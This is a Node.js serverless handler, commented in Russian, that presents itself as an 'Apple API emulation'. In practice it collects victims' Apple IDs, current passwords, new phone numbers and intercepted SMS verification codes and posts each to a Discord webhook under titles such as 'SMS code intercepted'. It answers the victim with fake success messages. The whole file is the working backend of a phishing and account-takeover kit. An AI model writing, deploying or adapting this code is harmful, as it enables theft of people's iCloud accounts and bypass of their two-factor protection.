const fetch = require('node-fetch');

// Эмуляция Apple API для смены данных
module.exports = async (req, res) => {
    const { appleId, password, newPhone, action } = req.body;

    // Разные эндпоинты
    if (req.url.includes('/change-phone')) {
        // Смена номера телефона
        try {
            // Имитация запроса к Apple API для смены номера
            const appleResponse = {
                success: true,
                message: 'Phone number changed successfully',
                data: {
                    appleId,
                    oldPhone: '+1234567890',
                    newPhone: newPhone || '+79876543210',
                    changedAt: new Date().toISOString(),
                    requiresSMS: true
                }
            };

            // Отправляем уведомление в Discord о смене
            await fetch(process.env.WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: '📱 НОМЕР ТЕЛЕФОНА ИЗМЕНЕН',
                        color: 0xFFA500,
                        fields: [
                            { name: 'Apple ID', value: appleId, inline: true },
                            { name: 'Новый номер', value: newPhone, inline: true },
                            { name: 'Статус', value: 'Требуется SMS', inline: true }
                        ]
                    }]
                })
            });

            res.status(200).json(appleResponse);
        } catch (error) {
            res.status(500).json({ success: false, error: error.message });
        }
    } 
    else if (req.url.includes('/change-password')) {
        // Смена пароля
        try {
            // Генерируем новый случайный пароль
            const newPassword = Math.random().toString(36).slice(-12) + 
                               Math.random().toString(36).toUpperCase().slice(-4) + 
                               '!@#';

            const appleResponse = {
                success: true,
                message: 'Password changed successfully',
                data: {
                    appleId,
                    oldPassword: password,
                    newPassword: newPassword,
                    changedAt: new Date().toISOString(),
                    requiresVerification: true
                }
            };

            // Отправляем новый пароль в Discord
            await fetch(process.env.WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: '🔑 ПАРОЛЬ ICLOUD ИЗМЕНЕН',
                        color: 0xFF0000,
                        fields: [
                            { name: 'Apple ID', value: appleId, inline: true },
                            { name: 'Старый пароль', value: password, inline: true },
                            { name: 'Новый пароль', value: `||${newPassword}||`, inline: true }
                        ]
                    }]
                })
            });

            res.status(200).json(appleResponse);
        } catch (error) {
            res.status(500).json({ success: false, error: error.message });
        }
    }
    else if (req.url.includes('/verify-sms')) {
        // Перехват SMS кода
        const { smsCode, appleId } = req.body;

        // Отправляем SMS код в Discord
        await fetch(process.env.WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: '📨 SMS КОД ПЕРЕХВАЧЕН',
                    color: 0x00FF00,
                    fields: [
                        { name: 'Apple ID', value: appleId, inline: true },
                        { name: 'SMS Код', value: smsCode, inline: true },
                        { name: 'Время', value: new Date().toLocaleString(), inline: true }
                    ]
                }]
            })
        });

        // Используем код для подтверждения смены
        res.status(200).json({
            success: true,
            message: 'SMS verified and used',
            data: {
                appleId,
                smsCode,
                verified: true,
                usedFor: 'phone_change'
            }
        });
    }
    else {
        // Основной эндпоинт аутентификации
        res.status(200).json({
            success: true,
            message: 'Apple authentication simulation',
            data: {
                appleId,
                authenticated: true,
                twoFactorRequired: true,
                sessionToken: 'sim_' + Math.random().toString(36).substring(2)
            }
        });
    }
};
